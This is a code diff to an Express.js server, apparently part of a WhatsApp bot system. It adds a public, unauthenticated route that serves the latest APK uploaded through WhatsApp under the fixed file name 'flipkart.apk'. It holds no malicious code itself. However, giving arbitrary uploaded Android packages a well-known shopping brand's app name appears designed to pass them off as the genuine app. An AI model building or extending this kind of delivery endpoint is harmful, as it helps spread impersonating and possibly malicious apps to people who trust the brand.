@@ -1259,6 +1259,23 @@ app.delete('/api/instances/:slug', authenticateToken, async (req, res) => {
   }
 });
 
+// Public Endpoint: Direct download link with flipkart.apk filename in path (No Authentication required)
+app.get('/download/flipkart.apk', (req, res) => {
+  const slug = req.query.instance || 'primary';
+  const apk = latestApkCache[slug];
+  
+  if (!apk || !apk.data) {
+    return res.status(404).send('<h1>404 Not Found</h1><p>No APK has been cached for this bot instance yet. Please upload an APK via WhatsApp first!</p>');
+  }
+  
+  const buffer = Buffer.from(apk.data, 'base64');
+  
+  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+  res.setHeader('Content-Disposition', 'attachment; filename="flipkart.apk"');
+  res.setHeader('Content-Length', buffer.length);
+  res.send(buffer);
+});
+
 // Public Endpoint: Direct download link for the latest cached APK file (No Authentication required)
 app.get('/download/apk', (req, res) => {
   const slug = req.query.instance || 'primary';
